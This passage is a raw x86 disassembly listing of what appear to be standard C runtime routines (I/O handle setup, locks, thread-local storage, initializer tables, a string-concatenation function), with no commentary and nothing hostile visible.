  4234a5:	mov    DWORD PTR [esp+0x34],eax
  4234a9:	call   edi
  4234ab:	mov    ebp,eax
  4234ad:	cmp    ebp,ebx
  4234af:	je     0x4234e3
  4234b1:	push   ebp
  4234b2:	call   0x424652
  4234b7:	cmp    eax,ebx
  4234b9:	pop    ecx
  4234ba:	mov    DWORD PTR [esp+0x10],eax
  4234be:	je     0x4234e3
  4234c0:	push   ebx
  4234c1:	push   ebx
  4234c2:	push   ebp
  4234c3:	push   eax
  4234c4:	push   DWORD PTR [esp+0x24]
  4234c8:	push   esi
  4234c9:	push   ebx
  4234ca:	push   ebx
  4234cb:	call   edi
  4234cd:	test   eax,eax
  4234cf:	jne    0x4234df
  4234d1:	push   DWORD PTR [esp+0x10]
  4234d5:	call   0x42453a
  4234da:	pop    ecx
  4234db:	mov    DWORD PTR [esp+0x10],ebx
  4234df:	mov    ebx,DWORD PTR [esp+0x10]
  4234e3:	push   esi
  4234e4:	call   DWORD PTR ds:0x428090
  4234ea:	mov    eax,ebx
  4234ec:	jmp    0x42353e
  4234ee:	cmp    eax,ebp
  4234f0:	je     0x4234fa
  4234f2:	cmp    eax,ebx
  4234f4:	je     0x4234fa
  4234f6:	xor    eax,eax
  4234f8:	jmp    0x42353e
  4234fa:	call   DWORD PTR ds:0x428040
  423500:	mov    esi,eax
  423502:	cmp    esi,ebx
  423504:	je     0x4234f6
  423506:	cmp    BYTE PTR [esi],bl
  423508:	je     0x423514
  42350a:	inc    eax
  42350b:	cmp    BYTE PTR [eax],bl
  42350d:	jne    0x42350a
  42350f:	inc    eax
  423510:	cmp    BYTE PTR [eax],bl
  423512:	jne    0x42350a
  423514:	sub    eax,esi
  423516:	inc    eax
  423517:	mov    ebp,eax
  423519:	push   ebp
  42351a:	call   0x424652
  42351f:	mov    edi,eax
  423521:	cmp    edi,ebx
  423523:	pop    ecx
  423524:	jne    0x42352a
  423526:	xor    edi,edi
  423528:	jmp    0x423535
  42352a:	push   ebp
  42352b:	push   esi
  42352c:	push   edi
  42352d:	call   0x424670
  423532:	add    esp,0xc
  423535:	push   esi
  423536:	call   DWORD PTR ds:0x42808c
  42353c:	mov    eax,edi
  42353e:	pop    edi
  42353f:	pop    esi
  423540:	pop    ebp
  423541:	pop    ebx
  423542:	pop    ecx
  423543:	pop    ecx
  423544:	ret    
  423545:	sub    esp,0x48
  423548:	push   ebx
  423549:	mov    ebx,0x480
  42354e:	push   ebx
  42354f:	call   0x424652
  423554:	test   eax,eax
  423556:	pop    ecx
  423557:	jne    0x423561
  423559:	or     eax,0xffffffff
  42355c:	jmp    0x42373e
  423561:	mov    ds:0x463340,eax
  423566:	mov    DWORD PTR ds:0x463328,0x20
  423570:	lea    ecx,[eax+0x480]
  423576:	jmp    0x423596
  423578:	and    BYTE PTR [eax+0x4],0x0
  42357c:	or     DWORD PTR [eax],0xffffffff
  42357f:	and    DWORD PTR [eax+0x8],0x0
  423583:	mov    BYTE PTR [eax+0x5],0xa
  423587:	mov    ecx,DWORD PTR ds:0x463340
  42358d:	add    eax,0x24
  423590:	add    ecx,0x480
  423596:	cmp    eax,ecx
  423598:	jb     0x423578
  42359a:	push   ebp
  42359b:	push   esi
  42359c:	push   edi
  42359d:	lea    eax,[esp+0x14]
  4235a1:	push   eax
  4235a2:	call   DWORD PTR ds:0x428064
  4235a8:	cmp    WORD PTR [esp+0x46],0x0
  4235ae:	je     0x42369d
  4235b4:	mov    eax,DWORD PTR [esp+0x48]
  4235b8:	test   eax,eax
  4235ba:	je     0x42369d
  4235c0:	mov    edi,DWORD PTR [eax]
  4235c2:	lea    ebp,[eax+0x4]
  4235c5:	lea    eax,[edi+ebp*1]
  4235c8:	mov    DWORD PTR [esp+0x10],eax
  4235cc:	mov    eax,0x800
  4235d1:	cmp    edi,eax
  4235d3:	jl     0x4235d7
  4235d5:	mov    edi,eax
  4235d7:	cmp    DWORD PTR ds:0x463328,edi
  4235dd:	jge    0x42362d
  4235df:	mov    esi,0x463344
  4235e4:	push   ebx
  4235e5:	call   0x424652
  4235ea:	test   eax,eax
  4235ec:	pop    ecx
  4235ed:	je     0x423627
  4235ef:	add    DWORD PTR ds:0x463328,0x20
  4235f6:	mov    DWORD PTR [esi],eax
  4235f8:	lea    ecx,[eax+0x480]
  4235fe:	jmp    0x423616
  423600:	and    BYTE PTR [eax+0x4],0x0
  423604:	or     DWORD PTR [eax],0xffffffff
  423607:	and    DWORD PTR [eax+0x8],0x0
  42360b:	mov    BYTE PTR [eax+0x5],0xa
  42360f:	mov    ecx,DWORD PTR [esi]
  423611:	add    eax,0x24
  423614:	add    ecx,ebx
  423616:	cmp    eax,ecx
  423618:	jb     0x423600
  42361a:	add    esi,0x4
  42361d:	cmp    DWORD PTR ds:0x463328,edi
  423623:	jl     0x4235e4
  423625:	jmp    0x42362d
  423627:	mov    edi,DWORD PTR ds:0x463328
  42362d:	xor    ebx,ebx
  42362f:	test   edi,edi
  423631:	jle    0x42369d
  423633:	mov    eax,DWORD PTR [esp+0x10]
  423637:	mov    eax,DWORD PTR [eax]
  423639:	cmp    eax,0xffffffff
  42363c:	je     0x423692
  42363e:	mov    cl,BYTE PTR [ebp+0x0]
  423641:	test   cl,0x1
  423644:	je     0x423692
  423646:	test   cl,0x8
  423649:	jne    0x423656
  42364b:	push   eax
  42364c:	call   DWORD PTR ds:0x428050
  423652:	test   eax,eax
  423654:	je     0x423692
  423656:	mov    ecx,ebx
  423658:	mov    eax,ebx
  42365a:	and    eax,0x1f
  42365d:	lea    eax,[eax+eax*8]
  423660:	sar    ecx,0x5
  423663:	mov    ecx,DWORD PTR [ecx*4+0x463340]
  42366a:	lea    esi,[ecx+eax*4]
  42366d:	mov    eax,DWORD PTR [esp+0x10]
  423671:	mov    eax,DWORD PTR [eax]
  423673:	mov    DWORD PTR [esi],eax
  423675:	mov    al,BYTE PTR [ebp+0x0]
  423678:	mov    BYTE PTR [esi+0x4],al
  42367b:	lea    eax,[esi+0xc]
  42367e:	push   0xfa0
  423683:	push   eax
  423684:	call   0x4249bd
  423689:	test   eax,eax
  42368b:	pop    ecx
  42368c:	pop    ecx
  42368d:	je     0x4236bd
  42368f:	inc    DWORD PTR [esi+0x8]
  423692:	add    DWORD PTR [esp+0x10],0x4
  423697:	inc    ebx
  423698:	inc    ebp
  423699:	cmp    ebx,edi
  42369b:	jl     0x423633
  42369d:	xor    ebx,ebx
  42369f:	mov    ecx,DWORD PTR ds:0x463340
  4236a5:	lea    eax,[ebx+ebx*8]
  4236a8:	lea    esi,[ecx+eax*4]
  4236ab:	cmp    DWORD PTR [esi],0xffffffff
  4236ae:	jne    0x42371f
  4236b0:	test   ebx,ebx
  4236b2:	mov    BYTE PTR [esi+0x4],0x81
  4236b6:	jne    0x4236c2
  4236b8:	push   0xfffffff6
  4236ba:	pop    eax
  4236bb:	jmp    0x4236cc
  4236bd:	or     eax,0xffffffff
  4236c0:	jmp    0x42373b
  4236c2:	mov    eax,ebx
  4236c4:	dec    eax
  4236c5:	neg    eax
  4236c7:	sbb    eax,eax
  4236c9:	add    eax,0xfffffff5
  4236cc:	push   eax
  4236cd:	call   DWORD PTR ds:0x428080
  4236d3:	mov    edi,eax
  4236d5:	cmp    edi,0xffffffff
  4236d8:	je     0x423719
  4236da:	push   edi
  4236db:	call   DWORD PTR ds:0x428050
  4236e1:	test   eax,eax
  4236e3:	je     0x423719
  4236e5:	and    eax,0xff
  4236ea:	cmp    eax,0x2
  4236ed:	mov    DWORD PTR [esi],edi
  4236ef:	jne    0x4236f7
  4236f1:	or     BYTE PTR [esi+0x4],0x40
  4236f5:	jmp    0x423700
  4236f7:	cmp    eax,0x3
  4236fa:	jne    0x423700
  4236fc:	or     BYTE PTR [esi+0x4],0x8
  423700:	lea    eax,[esi+0xc]
  423703:	push   0xfa0
  423708:	push   eax
  423709:	call   0x4249bd
  42370e:	test   eax,eax
  423710:	pop    ecx
  423711:	pop    ecx
  423712:	je     0x4236bd
  423714:	inc    DWORD PTR [esi+0x8]
  423717:	jmp    0x423723
  423719:	or     BYTE PTR [esi+0x4],0x40
  42371d:	jmp    0x423723
  42371f:	or     BYTE PTR [esi+0x4],0x80
  423723:	inc    ebx
  423724:	cmp    ebx,0x3
  423727:	jl     0x42369f
  42372d:	push   DWORD PTR ds:0x463328
  423733:	call   DWORD PTR ds:0x42809c
  423739:	xor    eax,eax
  42373b:	pop    edi
  42373c:	pop    esi
  42373d:	pop    ebp
  42373e:	pop    ebx
  42373f:	add    esp,0x48
  423742:	ret    
  423743:	push   0xc
  423745:	push   0x4284f0
  42374a:	call   0x423934
  42374f:	mov    DWORD PTR [ebp-0x1c],0x428f48
  423756:	cmp    DWORD PTR [ebp-0x1c],0x428f48
  42375d:	jae    0x423781
  42375f:	and    DWORD PTR [ebp-0x4],0x0
  423763:	mov    eax,DWORD PTR [ebp-0x1c]
  423766:	mov    eax,DWORD PTR [eax]
  423768:	test   eax,eax
  42376a:	je     0x423777
  42376c:	call   eax
  42376e:	jmp    0x423777
  423770:	xor    eax,eax
  423772:	inc    eax
  423773:	ret    
  423774:	mov    esp,DWORD PTR [ebp-0x18]
  423777:	or     DWORD PTR [ebp-0x4],0xffffffff
  42377b:	add    DWORD PTR [ebp-0x1c],0x4
  42377f:	jmp    0x423756
  423781:	call   0x42396f
  423786:	ret    
  423787:	push   0xc
  423789:	push   0x428500
  42378e:	call   0x423934
  423793:	mov    DWORD PTR [ebp-0x1c],0x428f50
  42379a:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  4237a1:	jae    0x4237c5
  4237a3:	and    DWORD PTR [ebp-0x4],0x0
  4237a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4237aa:	mov    eax,DWORD PTR [eax]
  4237ac:	test   eax,eax
  4237ae:	je     0x4237bb
  4237b0:	call   eax
  4237b2:	jmp    0x4237bb
  4237b4:	xor    eax,eax
  4237b6:	inc    eax
  4237b7:	ret    
  4237b8:	mov    esp,DWORD PTR [ebp-0x18]
  4237bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237bf:	add    DWORD PTR [ebp-0x1c],0x4
  4237c3:	jmp    0x42379a
  4237c5:	call   0x42396f
  4237ca:	ret    
  4237cb:	call   0x423a06
  4237d0:	mov    eax,ds:0x4624d4
  4237d5:	cmp    eax,0xffffffff
  4237d8:	je     0x4237e8
  4237da:	push   eax
  4237db:	call   DWORD PTR ds:0x4280a4
  4237e1:	or     DWORD PTR ds:0x4624d4,0xffffffff
  4237e8:	ret    
  4237e9:	push   ebx
  4237ea:	push   esi
  4237eb:	call   DWORD PTR ds:0x42801c
  4237f1:	push   DWORD PTR ds:0x4624d4
  4237f7:	mov    ebx,eax
  4237f9:	call   DWORD PTR ds:0x4280b0
  4237ff:	mov    esi,eax
  423801:	test   esi,esi
  423803:	jne    0x42384e
  423805:	push   0x88
  42380a:	push   0x1
  42380c:	call   0x424a48
  423811:	mov    esi,eax
  423813:	test   esi,esi
  423815:	pop    ecx
  423816:	pop    ecx
  423817:	je     0x423846
  423819:	push   esi
  42381a:	push   DWORD PTR ds:0x4624d4
  423820:	call   DWORD PTR ds:0x4280ac
  423826:	test   eax,eax
  423828:	je     0x423846
  42382a:	mov    DWORD PTR [esi+0x54],0x462428
  423831:	mov    DWORD PTR [esi+0x14],0x1
  423838:	call   DWORD PTR ds:0x42802c
  42383e:	or     DWORD PTR [esi+0x4],0xffffffff
  423842:	mov    DWORD PTR [esi],eax
  423844:	jmp    0x42384e
  423846:	push   0x10
  423848:	call   0x4229fc
  42384d:	pop    ecx
  42384e:	push   ebx
  42384f:	call   DWORD PTR ds:0x4280a8
  423855:	mov    eax,esi
  423857:	pop    esi
  423858:	pop    ebx
  423859:	ret    
  42385a:	call   0x4239bd
  42385f:	test   eax,eax
  423861:	je     0x423873
  423863:	call   DWORD PTR ds:0x4280b4
  423869:	cmp    eax,0xffffffff
  42386c:	mov    ds:0x4624d4,eax
  423871:	jne    0x42387b
  423873:	call   0x4237cb
  423878:	xor    eax,eax
  42387a:	ret    
  42387b:	push   esi
  42387c:	push   0x88
  423881:	push   0x1
  423883:	call   0x424a48
  423888:	mov    esi,eax
  42388a:	test   esi,esi
  42388c:	pop    ecx
  42388d:	pop    ecx
  42388e:	je     0x4238c0
  423890:	push   esi
  423891:	push   DWORD PTR ds:0x4624d4
  423897:	call   DWORD PTR ds:0x4280ac
  42389d:	test   eax,eax
  42389f:	je     0x4238c0
  4238a1:	mov    DWORD PTR [esi+0x54],0x462428
  4238a8:	mov    DWORD PTR [esi+0x14],0x1
  4238af:	call   DWORD PTR ds:0x42802c
  4238b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4238b9:	mov    DWORD PTR [esi],eax
  4238bb:	xor    eax,eax
  4238bd:	inc    eax
  4238be:	pop    esi
  4238bf:	ret    
  4238c0:	call   0x4237cb
  4238c5:	xor    eax,eax
  4238c7:	pop    esi
  4238c8:	ret    
  4238c9:	cmp    DWORD PTR ds:0x462ca4,0x2
  4238d0:	jne    0x4238df
  4238d2:	cmp    DWORD PTR ds:0x462cb0,0x5
  4238d9:	jb     0x4238df
  4238db:	xor    eax,eax
  4238dd:	inc    eax
  4238de:	ret    
  4238df:	push   0x3
  4238e1:	pop    eax
  4238e2:	ret    
  4238e3:	xor    eax,eax
  4238e5:	cmp    DWORD PTR [esp+0x4],eax
  4238e9:	push   0x0
  4238eb:	sete   al
  4238ee:	push   0x1000
  4238f3:	push   eax
  4238f4:	call   DWORD PTR ds:0x4280bc
  4238fa:	test   eax,eax
  4238fc:	mov    ds:0x463320,eax
  423901:	je     0x42392d
  423903:	call   0x4238c9
  423908:	cmp    eax,0x3
  42390b:	mov    ds:0x463324,eax
  423910:	jne    0x423930
  423912:	push   0x3f8
  423917:	call   0x424cca
  42391c:	test   eax,eax
  42391e:	pop    ecx
  42391f:	jne    0x423930
  423921:	push   DWORD PTR ds:0x463320
  423927:	call   DWORD PTR ds:0x4280b8
  42392d:	xor    eax,eax
  42392f:	ret    
  423930:	xor    eax,eax
  423932:	inc    eax
  423933:	ret    
  423934:	push   0x4257f8
  423939:	mov    eax,fs:0x0
  42393f:	push   eax
  423940:	mov    eax,DWORD PTR [esp+0x10]
  423944:	mov    DWORD PTR [esp+0x10],ebp
  423948:	lea    ebp,[esp+0x10]
  42394c:	sub    esp,eax
  42394e:	push   ebx
  42394f:	push   esi
  423950:	push   edi
  423951:	mov    eax,DWORD PTR [ebp-0x8]
  423954:	mov    DWORD PTR [ebp-0x18],esp
  423957:	push   eax
  423958:	mov    eax,DWORD PTR [ebp-0x4]
  42395b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423962:	mov    DWORD PTR [ebp-0x8],eax
  423965:	lea    eax,[ebp-0x10]
  423968:	mov    fs:0x0,eax
  42396e:	ret    
  42396f:	mov    ecx,DWORD PTR [ebp-0x10]
  423972:	mov    DWORD PTR fs:0x0,ecx
  423979:	pop    ecx
  42397a:	pop    edi
  42397b:	pop    esi
  42397c:	pop    ebx
  42397d:	leave  
  42397e:	push   ecx
  42397f:	ret    
  423980:	cmp    eax,0x1000
  423985:	jae    0x423995
  423987:	neg    eax
  423989:	add    eax,esp
  42398b:	add    eax,0x4
  42398e:	test   DWORD PTR [eax],eax
  423990:	xchg   esp,eax
  423991:	mov    eax,DWORD PTR [eax]
  423993:	push   eax
  423994:	ret    
  423995:	push   ecx
  423996:	lea    ecx,[esp+0x8]
  42399a:	sub    ecx,0x1000
  4239a0:	sub    eax,0x1000
  4239a5:	test   DWORD PTR [ecx],eax
  4239a7:	cmp    eax,0x1000
  4239ac:	jae    0x42399a
  4239ae:	sub    ecx,eax
  4239b0:	mov    eax,esp
  4239b2:	test   DWORD PTR [ecx],eax
  4239b4:	mov    esp,ecx
  4239b6:	mov    ecx,DWORD PTR [eax]
  4239b8:	mov    eax,DWORD PTR [eax+0x4]
  4239bb:	push   eax
  4239bc:	ret    
  4239bd:	push   esi
  4239be:	push   edi
  4239bf:	xor    esi,esi
  4239c1:	mov    edi,0x462e00
  4239c6:	cmp    DWORD PTR [esi*8+0x4624e4],0x1
  4239ce:	jne    0x4239ee
  4239d0:	lea    eax,[esi*8+0x4624e0]
  4239d7:	mov    DWORD PTR [eax],edi
  4239d9:	push   0xfa0
  4239de:	push   DWORD PTR [eax]
  4239e0:	add    edi,0x18
  4239e3:	call   0x4249bd
  4239e8:	test   eax,eax
  4239ea:	pop    ecx
  4239eb:	pop    ecx
  4239ec:	je     0x4239fa
  4239ee:	inc    esi
  4239ef:	cmp    esi,0x24
  4239f2:	jl     0x4239c6
  4239f4:	xor    eax,eax
  4239f6:	inc    eax
  4239f7:	pop    edi
  4239f8:	pop    esi
  4239f9:	ret    
  4239fa:	and    DWORD PTR [esi*8+0x4624e0],0x0
  423a02:	xor    eax,eax
  423a04:	jmp    0x4239f7
  423a06:	push   ebx
  423a07:	mov    ebx,DWORD PTR ds:0x4280a0
  423a0d:	push   esi
  423a0e:	mov    esi,0x4624e0
  423a13:	push   edi
  423a14:	mov    edi,DWORD PTR [esi]
  423a16:	test   edi,edi
  423a18:	je     0x423a2d
  423a1a:	cmp    DWORD PTR [esi+0x4],0x1
  423a1e:	je     0x423a2d
  423a20:	push   edi
  423a21:	call   ebx
  423a23:	push   edi
  423a24:	call   0x42453a
  423a29:	and    DWORD PTR [esi],0x0
  423a2c:	pop    ecx
  423a2d:	add    esi,0x8
  423a30:	cmp    esi,0x462600
  423a36:	jl     0x423a14
  423a38:	mov    esi,0x4624e0
  423a3d:	pop    edi
  423a3e:	mov    eax,DWORD PTR [esi]
  423a40:	test   eax,eax
  423a42:	je     0x423a4d
  423a44:	cmp    DWORD PTR [esi+0x4],0x1
  423a48:	jne    0x423a4d
  423a4a:	push   eax
  423a4b:	call   ebx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x462600
  423a56:	jl     0x423a3e
  423a58:	pop    esi
  423a59:	pop    ebx
  423a5a:	ret    
  423a5b:	push   ebp
  423a5c:	mov    ebp,esp
  423a5e:	mov    eax,DWORD PTR [ebp+0x8]
  423a61:	push   DWORD PTR [eax*8+0x4624e0]
  423a68:	call   DWORD PTR ds:0x4280c8
  423a6e:	pop    ebp
  423a6f:	ret    
  423a70:	push   ebp
  423a71:	mov    ebp,esp
  423a73:	push   esi
  423a74:	mov    esi,DWORD PTR [ebp+0x8]
  423a77:	lea    esi,[esi*8+0x4624e0]
  423a7e:	cmp    DWORD PTR [esi],0x0
  423a81:	je     0x423a88
  423a83:	xor    eax,eax
  423a85:	inc    eax
  423a86:	jmp    0x423aec
  423a88:	push   edi
  423a89:	push   0x18
  423a8b:	call   0x424652
  423a90:	mov    edi,eax
  423a92:	test   edi,edi
  423a94:	pop    ecx
  423a95:	jne    0x423aa6
  423a97:	call   0x4258d0
  423a9c:	mov    DWORD PTR [eax],0xc
  423aa2:	xor    eax,eax
  423aa4:	jmp    0x423aeb
  423aa6:	push   0xa
  423aa8:	call   0x423aef
  423aad:	cmp    DWORD PTR [esi],0x0
  423ab0:	pop    ecx
  423ab1:	jne    0x423ad9
  423ab3:	push   0xfa0
  423ab8:	push   edi
  423ab9:	call   0x4249bd
  423abe:	test   eax,eax
  423ac0:	pop    ecx
  423ac1:	pop    ecx
  423ac2:	jne    0x423ad5
  423ac4:	push   edi
  423ac5:	call   0x42453a
  423aca:	push   0xa
  423acc:	call   0x423a5b
  423ad1:	pop    ecx
  423ad2:	pop    ecx
  423ad3:	jmp    0x423a97
  423ad5:	mov    DWORD PTR [esi],edi
  423ad7:	jmp    0x423ae0
  423ad9:	push   edi
  423ada:	call   0x42453a
  423adf:	pop    ecx
  423ae0:	push   0xa
  423ae2:	call   0x423a5b
  423ae7:	xor    eax,eax
  423ae9:	pop    ecx
  423aea:	inc    eax
  423aeb:	pop    edi
  423aec:	pop    esi
  423aed:	pop    ebp
  423aee:	ret    
  423aef:	push   ebp
  423af0:	mov    ebp,esp
  423af2:	mov    eax,DWORD PTR [ebp+0x8]
  423af5:	push   esi
  423af6:	lea    esi,[eax*8+0x4624e0]
  423afd:	cmp    DWORD PTR [esi],0x0
  423b00:	jne    0x423b15
  423b02:	push   eax
  423b03:	call   0x423a70
  423b08:	test   eax,eax
  423b0a:	pop    ecx
  423b0b:	jne    0x423b15
  423b0d:	push   0x11
  423b0f:	call   0x4229fc
  423b14:	pop    ecx
  423b15:	push   DWORD PTR [esi]
  423b17:	call   DWORD PTR ds:0x4280cc
  423b1d:	pop    esi
  423b1e:	pop    ebp
  423b1f:	ret    
  423b20:	push   esi
  423b21:	push   DWORD PTR ds:0x463448
  423b27:	call   0x425a86
  423b2c:	pop    ecx
  423b2d:	mov    ecx,DWORD PTR ds:0x463444
  423b33:	mov    esi,eax
  423b35:	mov    eax,ds:0x463448
  423b3a:	mov    edx,ecx
  423b3c:	sub    edx,eax
  423b3e:	add    edx,0x4
  423b41:	cmp    esi,edx
  423b43:	jae    0x423b93
  423b45:	mov    ecx,0x800
  423b4a:	cmp    esi,ecx
  423b4c:	jae    0x423b50
  423b4e:	mov    ecx,esi
  423b50:	add    ecx,esi
  423b52:	push   ecx
  423b53:	push   eax
  423b54:	call   0x4258d9
  423b59:	test   eax,eax
  423b5b:	pop    ecx
  423b5c:	pop    ecx
  423b5d:	jne    0x423b76
  423b5f:	add    esi,0x10
  423b62:	push   esi
  423b63:	push   DWORD PTR ds:0x463448
  423b69:	call   0x4258d9
  423b6e:	test   eax,eax
  423b70:	pop    ecx
  423b71:	pop    ecx
  423b72:	jne    0x423b76
  423b74:	pop    esi
  423b75:	ret    
  423b76:	mov    ecx,DWORD PTR ds:0x463444
  423b7c:	sub    ecx,DWORD PTR ds:0x463448
  423b82:	mov    ds:0x463448,eax
  423b87:	sar    ecx,0x2
  423b8a:	lea    ecx,[eax+ecx*4]
  423b8d:	mov    DWORD PTR ds:0x463444,ecx
  423b93:	mov    DWORD PTR [ecx],edi
  423b95:	add    DWORD PTR ds:0x463444,0x4
  423b9c:	mov    eax,edi
  423b9e:	pop    esi
  423b9f:	ret    
  423ba0:	push   0x80
  423ba5:	call   0x424652
  423baa:	test   eax,eax
  423bac:	pop    ecx
  423bad:	mov    ds:0x463448,eax
  423bb2:	jne    0x423bb8
  423bb4:	push   0x18
  423bb6:	pop    eax
  423bb7:	ret    
  423bb8:	and    DWORD PTR [eax],0x0
  423bbb:	mov    eax,ds:0x463448
  423bc0:	mov    ds:0x463444,eax
  423bc5:	xor    eax,eax
  423bc7:	ret    
  423bc8:	push   0xc
  423bca:	push   0x428510
  423bcf:	call   0x423934
  423bd4:	call   0x422c47
  423bd9:	and    DWORD PTR [ebp-0x4],0x0
  423bdd:	mov    edi,DWORD PTR [ebp+0x8]
  423be0:	call   0x423b20
  423be5:	mov    DWORD PTR [ebp-0x1c],eax
  423be8:	or     DWORD PTR [ebp-0x4],0xffffffff
  423bec:	call   0x423bfa
  423bf1:	mov    eax,DWORD PTR [ebp-0x1c]
  423bf4:	call   0x42396f
  423bf9:	ret    
  423bfa:	call   0x422c50
  423bff:	ret    
  423c00:	push   DWORD PTR [esp+0x4]
  423c04:	call   0x423bc8
  423c09:	neg    eax
  423c0b:	sbb    eax,eax
  423c0d:	neg    eax
  423c0f:	pop    ecx
  423c10:	dec    eax
  423c11:	ret    
  423c12:	push   ebp
  423c13:	mov    ebp,esp
  423c15:	sub    esp,0x10
  423c18:	push   ebx
  423c19:	xor    ebx,ebx
  423c1b:	cmp    DWORD PTR ds:0x462f50,ebx
  423c21:	push   esi
  423c22:	push   edi
  423c23:	jne    0x423c92
  423c25:	push   0x428580
  423c2a:	call   DWORD PTR ds:0x4280d0
  423c30:	mov    edi,eax
  423c32:	cmp    edi,ebx
  423c34:	je     0x423ccd
  423c3a:	mov    esi,DWORD PTR ds:0x428014
  423c40:	push   0x428574
  423c45:	push   edi
  423c46:	call   esi
  423c48:	test   eax,eax
  423c4a:	mov    ds:0x462f50,eax
  423c4f:	je     0x423ccd
  423c51:	push   0x428564
  423c56:	push   edi
  423c57:	call   esi
  423c59:	push   0x428550
  423c5e:	push   edi
  423c5f:	mov    ds:0x462f54,eax
  423c64:	call   esi
  423c66:	cmp    DWORD PTR ds:0x462ca4,0x2
  423c6d:	mov    ds:0x462f58,eax
  423c72:	jne    0x423c92
  423c74:	push   0x428534
  423c79:	push   edi
  423c7a:	call   esi
  423c7c:	test   eax,eax
  423c7e:	mov    ds:0x462f60,eax
  423c83:	je     0x423c92
  423c85:	push   0x42851c
  423c8a:	push   edi
  423c8b:	call   esi
  423c8d:	mov    ds:0x462f5c,eax
  423c92:	mov    eax,ds:0x462f5c
  423c97:	test   eax,eax
  423c99:	je     0x423cd7
  423c9b:	call   eax
  423c9d:	test   eax,eax
  423c9f:	je     0x423cbe
  423ca1:	lea    ecx,[ebp-0x4]
  423ca4:	push   ecx
  423ca5:	push   0xc
  423ca7:	lea    ecx,[ebp-0x10]
  423caa:	push   ecx
  423cab:	push   0x1
  423cad:	push   eax
  423cae:	call   DWORD PTR ds:0x462f60
  423cb4:	test   eax,eax
  423cb6:	je     0x423cbe
  423cb8:	test   BYTE PTR [ebp-0x8],0x1
  423cbc:	jne    0x423cd7
  423cbe:	cmp    DWORD PTR ds:0x462cb0,0x4
  423cc5:	jb     0x423cd1
  423cc7:	or     BYTE PTR [ebp+0x12],0x20
  423ccb:	jmp    0x423cf6
  423ccd:	xor    eax,eax
  423ccf:	jmp    0x423d06
  423cd1:	or     BYTE PTR [ebp+0x12],0x4
  423cd5:	jmp    0x423cf6
  423cd7:	mov    eax,ds:0x462f54
  423cdc:	test   eax,eax
  423cde:	je     0x423cf6
  423ce0:	call   eax
  423ce2:	mov    ebx,eax
  423ce4:	test   ebx,ebx
  423ce6:	je     0x423cf6
  423ce8:	mov    eax,ds:0x462f58
  423ced:	test   eax,eax
  423cef:	je     0x423cf6
  423cf1:	push   ebx
  423cf2:	call   eax
  423cf4:	mov    ebx,eax
  423cf6:	push   DWORD PTR [ebp+0x10]
  423cf9:	push   DWORD PTR [ebp+0xc]
  423cfc:	push   DWORD PTR [ebp+0x8]
  423cff:	push   ebx
  423d00:	call   DWORD PTR ds:0x462f50
  423d06:	pop    edi
  423d07:	pop    esi
  423d08:	pop    ebx
  423d09:	leave  
  423d0a:	ret    
  423d0b:	int3   
  423d0c:	int3   
  423d0d:	int3   
  423d0e:	int3   
  423d0f:	int3   
  423d10:	push   edi
  423d11:	mov    edi,DWORD PTR [esp+0x8]
  423d15:	jmp    0x423d85
  423d17:	lea    esp,[esp+0x0]
  423d1e:	mov    edi,edi
  423d20:	mov    ecx,DWORD PTR [esp+0x4]
  423d24:	push   edi
  423d25:	test   ecx,0x3
  423d2b:	je     0x423d40
  423d2d:	mov    al,BYTE PTR [ecx]
  423d2f:	add    ecx,0x1
  423d32:	test   al,al
  423d34:	je     0x423d73
  423d36:	test   ecx,0x3
  423d3c:	jne    0x423d2d
  423d3e:	mov    edi,edi
  423d40:	mov    eax,DWORD PTR [ecx]
  423d42:	mov    edx,0x7efefeff
  423d47:	add    edx,eax
  423d49:	xor    eax,0xffffffff
  423d4c:	xor    eax,edx
  423d4e:	add    ecx,0x4
  423d51:	test   eax,0x81010100
  423d56:	je     0x423d40
  423d58:	mov    eax,DWORD PTR [ecx-0x4]
  423d5b:	test   al,al
  423d5d:	je     0x423d82
  423d5f:	test   ah,ah
  423d61:	je     0x423d7d
  423d63:	test   eax,0xff0000
  423d68:	je     0x423d78
  423d6a:	test   eax,0xff000000
  423d6f:	je     0x423d73
  423d71:	jmp    0x423d40
  423d73:	lea    edi,[ecx-0x1]
  423d76:	jmp    0x423d85
  423d78:	lea    edi,[ecx-0x2]
  423d7b:	jmp    0x423d85
  423d7d:	lea    edi,[ecx-0x3]
  423d80:	jmp    0x423d85
  423d82:	lea    edi,[ecx-0x4]
  423d85:	mov    ecx,DWORD PTR [esp+0xc]
  423d89:	test   ecx,0x3
  423d8f:	je     0x423dae
  423d91:	mov    dl,BYTE PTR [ecx]
  423d93:	add    ecx,0x1
  423d96:	test   dl,dl
  423d98:	je     0x423e00
  423d9a:	mov    BYTE PTR [edi],dl
  423d9c:	add    edi,0x1
  423d9f:	test   ecx,0x3
  423da5:	jne    0x423d91
  423da7:	jmp    0x423dae
  423da9:	mov    DWORD PTR [edi],edx
  423dab:	add    edi,0x4
  423dae:	mov    edx,0x7efefeff
  423db3:	mov    eax,DWORD PTR [ecx]
  423db5:	add    edx,eax
  423db7:	xor    eax,0xffffffff
  423dba:	xor    eax,edx
  423dbc:	mov    edx,DWORD PTR [ecx]
  423dbe:	add    ecx,0x4
  423dc1:	test   eax,0x81010100
  423dc6:	je     0x423da9
  423dc8:	test   dl,dl
  423dca:	je     0x423e00
  423dcc:	test   dh,dh
  423dce:	je     0x423df7
  423dd0:	test   edx,0xff0000
  423dd6:	je     0x423dea
  423dd8:	test   edx,0xff000000
  423dde:	je     0x423de2
  423de0:	jmp    0x423da9
  423de2:	mov    DWORD PTR [edi],edx
  423de4:	mov    eax,DWORD PTR [esp+0x8]
  423de8:	pop    edi
  423de9:	ret    
  423dea:	mov    WORD PTR [edi],dx
  423ded:	mov    eax,DWORD PTR [esp+0x8]
  423df1:	mov    BYTE PTR [edi+0x2],0x0
  423df5:	pop    edi
  423df6:	ret    
  423df7:	mov    WORD PTR [edi],dx
  423dfa:	mov    eax,DWORD PTR [esp+0x8]
  423dfe:	pop    edi
  423dff:	ret    
  423e00:	mov    BYTE PTR [edi],dl
  423e02:	mov    eax,DWORD PTR [esp+0x8]
  423e06:	pop    edi
  423e07:	ret    
  423e08:	int3   
  423e09:	int3   
  423e0a:	int3   
  423e0b:	int3   
  423e0c:	int3   
  423e0d:	int3   
  423e0e:	int3   
  423e0f:	int3   
